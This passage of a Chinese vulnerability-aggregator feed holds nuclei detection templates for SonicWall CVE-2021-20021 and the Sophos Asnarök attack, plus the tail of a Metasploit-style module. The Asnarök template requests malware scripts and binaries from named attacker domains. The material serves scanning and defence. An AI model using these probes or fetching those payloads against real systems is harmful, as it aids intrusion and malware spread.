class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入&lt;/p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SonicWall Email Security 权限控制漏洞</title>
    <link href="http://example.com/2025/06/30/github_443250844/"/>
    <id>http://example.com/2025/06/30/github_443250844/</id>
    <published>2025-06-30T15:00:17.972Z</published>
    <updated>2025-06-30T15:00:17.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SonicWall Email Security 权限控制漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-20021</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> SonicWall Email Security 10.0.9.x版本中存在权限控制漏洞，攻击者可以通过发送特制的HTTP请求到远程主机来创建管理员账户。</p><p><strong>产品厂商：</strong> SonicWall</p><p><strong>产品名称：</strong> Email Security</p><p><strong>影响版本：</strong> 10.0.9.x</p><p><strong>搜索语法：</strong> SonicWall Email Security</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/1e39789f2753a382e8f369c51c80c4db72e1c7f9/http%2Fcves%2F2021%2FCVE-2021-20021.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/1e39789f2753a382e8f369c51c80c4db72e1c7f9/http%2Fcves%2F2021%2FCVE-2021-20021.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2021-20021</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">SonicWall Email Security - Broken Access Control</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mavrickrishi</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">A vulnerability in the SonicWall Email Security version 10.0.9.x allows an attacker to create an administrative account by sending a crafted HTTP request to the remote host.</span><br><span class="hljs-attribute">  reference</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://nvd.nist.gov/vuln/detail/CVE-2021-20021</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.sonicwall.com/support/product-notification/security-notice-sonicwall-email-security-zero-day-vulnerabilities/210416112932360/</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploits-in-sonicwall-email-security-lead-to-compromise</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.cisa.gov/known-exploited-vulnerabilities-catalog</span><br>  <span class="hljs-attribute">remediation</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Update to the latest version of SonicWall Email Security or apply security patches provided by SonicWall.</span><br><span class="hljs-attribute">  classification</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">cvss-metrics</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span><br>    <span class="hljs-attribute">cvss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9.8</span><br>    <span class="hljs-attribute">cve-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CVE-2021-20021</span><br>    <span class="hljs-attribute">cwe-id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">CWE-269</span><br>    <span class="hljs-attribute">epss-score</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.97359</span><br>    <span class="hljs-attribute">epss-percentile</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0.99972</span><br>    <span class="hljs-attribute">cpe</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cpe:2.3:a:sonicwall:email_security:*:*:*:*:*:*:*:*</span><br>  <span class="hljs-attribute">metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">verified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span><br>    <span class="hljs-attribute">vendor</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sonicwall</span><br>    <span class="hljs-attribute">product</span><span class="hljs-punctuation">:</span> <span class="hljs-string">email_security</span><br>    <span class="hljs-attribute">shodan-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">SonicWall Email Security</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">cve,cve2021,sonicwall,unauth,kev</span><br><br><span class="hljs-attribute">flow</span><span class="hljs-punctuation">:</span> <span class="hljs-string">http(1) || http(2)</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: GET</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/createou?data=test123&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">Error in parsing request</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">400</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">500</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">response</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">SonicWall</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: POST</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/createou&quot;</span><br>    <span class="hljs-attribute">headers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><br>    <span class="hljs-attribute">body</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>      <span class="hljs-attribute">data=&lt;xml&gt;test&lt;/xml&gt;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">Error in parsing request</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">400</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">500</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">response</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">SonicWall</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; SonicWall Email Security 权限控制漏洞&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Sophos Firewall Asnarök Malware Detection - CVE-2020-12271</title>
    <link href="http://example.com/2025/06/30/github_2388424155/"/>
    <id>http://example.com/2025/06/30/github_2388424155/</id>
    <published>2025-06-30T14:45:26.011Z</published>
    <updated>2025-06-30T14:45:26.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Sophos Firewall Asnarök Malware Detection - CVE-2020-12271</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-12271</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 在Sophos XG Firewall设备的SFOS 17.0、17.1、17.5和18.0版本中，于2020年4月25日之前发现了一个SQL注入问题，该问题在2020年4月被野外利用。此问题影响了配置了管理（HTTPS）服务或用户门户暴露在WAN区域的设备。成功的攻击可能导致远程代码执行，泄露本地设备管理员、门户管理员和用于远程访问的用户账户（但不包括外部Active Directory或LDAP密码）的用户名和哈希密码。</p><p><strong>产品厂商：</strong> Sophos</p><p><strong>产品名称：</strong> Sophos XG Firewall</p><p><strong>影响版本：</strong> 17.0, 17.1, 17.5, and 18.0 before 2020-04-25</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/235f7f09bd771248ed5d60c1829771ca6c274c15/http%2Fcves%2F2020%2FCVE-2020-12271.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/235f7f09bd771248ed5d60c1829771ca6c274c15/http%2Fcves%2F2020%2FCVE-2020-12271.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">12271</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Sophos Firewall Asnarök Malware Detection <span class="hljs-operator">-</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">12271</span><br>  <span class="hljs-params">author:</span> redperfect1847<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    A SQL injection issue was found <span class="hljs-keyword">in</span> SFOS <span class="hljs-number">17.0</span>, <span class="hljs-number">17.1</span>, <span class="hljs-number">17.5</span>, and <span class="hljs-number">18.0</span> before <span class="hljs-number">202</span>0-<span class="hljs-number">0</span>4-<span class="hljs-number">25</span> on Sophos XG Firewall devices, as exploited <span class="hljs-keyword">in</span> the wild <span class="hljs-keyword">in</span> April <span class="hljs-number">2020</span>. This affected devices configured <span class="hljs-keyword">with</span> either the administration (HTTPS) service <span class="hljs-keyword">or</span> the User Portal exposed on the WAN zone. A successful attack may have caused remote code execution that exfiltrated usernames and hashed passwords for the local device admin(s), portal admins, and user accounts used for remote access (but not external Active Directory <span class="hljs-keyword">or</span> LDAP passwords).<br>  <span class="hljs-params">tags:</span> malware,asnarok,sophos,rce,sql-injection<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>news.sophos.com<span class="hljs-operator">/</span>en-us<span class="hljs-operator">/</span><span class="hljs-number">2020</span><span class="hljs-operator">/</span><span class="hljs-number">04</span><span class="hljs-operator">/</span><span class="hljs-number">26</span><span class="hljs-operator">/</span>asnarok<span class="hljs-symbol">/</span><br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">interactsh_url:</span> <span class="hljs-string">&quot;&#123;&#123;interactsh-url&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/Install.sh</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;chmod +x&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sh_guard/lc</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;downloaded lp&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/sophos.dat</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;ELF&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;binaries&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/octet-stream&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/ae.sh</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> sophosfirewallupdate.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Modified scripts&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/sp/patch.sh</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> ragnarokfromasgard.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;#!/bin/bash&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;patching system&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/x-sh&quot;</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/bkin</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> filedownloaderservers.com<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;ELF&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Executable&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;content-type: application/octet-stream&quot;</span><br><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Sophos Firewall Asnarök Malware Detecti</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>【高危漏洞预警】Apache Seata反序列化漏洞(CVE-2025-32897)</title>
    <link href="http://example.com/2025/06/30/weixin_3037147094/"/>
    <id>http://example.com/2025/06/30/weixin_3037147094/</id>
    <published>2025-06-30T14:44:14.720Z</published>
    <updated>2025-06-30T14:44:14.718Z</updated>
    
    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/-rtZnsY85Nfd1dXrz1Z-sQ">https://mp.weixin.qq.com/s/-rtZnsY85Nfd1dXrz1Z-sQ</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/-rtZnsY85Nfd1dXrz1Z-sQ&quot;&gt;https://mp.weixin.qq</summary>
      
    
    
    
    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
    
    
    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
    
    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Sophos XG Firewall SQL注入漏洞</title>
    <link href="http://example.com/2025/06/30/github_1289160115/"/>
    <id>http://example.com/2025/06/30/github_1289160115/</id>
    <published>2025-06-30T14:00:41.022Z</published>
    <updated>2025-06-30T14:00:41.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Sophos XG Firewall SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-12271</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 在Sophos XG Firewall设备的SFOS 17.0、17.1、17.5和18.0版本中，发现了一个SQL注入问题，此问题在2020年4月被野外利用。影响配置了管理（HTTPS）服务或在WAN区域暴露用户门户的设备。成功的攻击可能导致远程代码执行，泄露本地设备管理员、门户管理员和用于远程访问的用户账户的用户名和哈希密码（但不包括外部Active Directory或LDAP密码）。</p><p><strong>产品厂商：</strong> Sophos</p><p><strong>产品名称：</strong> Sophos XG Firewall</p><p><strong>影响版本：</strong> 17.0, 17.1, 17.5, 18.0 before 2020-04-25</p><p><strong>搜索语法：</strong> http.title:”sophos”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12499">https://github.com/projectdiscovery/nuclei-templates/issues/12499</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>A SQL injection issue was found in SFOS 17.0, 17.1, 17.5, and 18.0 before 2020-04-25 on Sophos XG Firewall devices, as exploited in the wild in April 2020. This affected devices configured with either the administration (HTTPS) service or the User Portal exposed on the WAN zone. A successful attack may have caused remote code execution that exfiltrated usernames and hashed passwords for the local device admin(s), portal admins, and user accounts used for remote access (but not external Active Directory or LDAP passwords)</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://news.sophos.com/en-us/2020/04/26/asnarok/">https://news.sophos.com/en-us/2020/04/26/asnarok/</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-sophos"><a href="#Shodan-Query-http-title-sophos" class="headerlink" title="Shodan Query: http.title:&quot;sophos&quot;"></a>Shodan Query: <code>http.title:&quot;sophos&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
    
    
      
      
